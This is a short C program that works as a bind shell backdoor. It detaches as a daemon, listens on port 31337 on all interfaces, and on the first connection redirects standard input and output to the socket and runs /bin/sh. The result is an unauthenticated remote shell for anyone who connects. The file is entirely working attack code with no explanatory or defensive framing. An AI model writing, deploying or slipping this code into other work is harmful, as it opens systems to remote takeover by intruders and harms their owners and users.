int main(void)
{
  int sd, cli, port;

  char *servaddr =  "\x02\x00"             //  Address family (AF_INET, INADDR_ANY)
                    "\x7A\x69"             //  port 31337
                    "\x00\x00\x00\x00"
                    "\x00\x00\x00\x00"
                    "\x00\x00\x00\x00";
  daemon(1, 0);

  sd = socket(2, 1, 6);
  if (bind(sd, servaddr, 16) !=0) return;


  listen(sd, 1);
  cli = accept(sd, 0, 0);
  dup2(cli, 0);
  dup2(cli, 1);
  dup2(cli, 2);
  execve("/bin/sh", 0, 0);
  return;
}
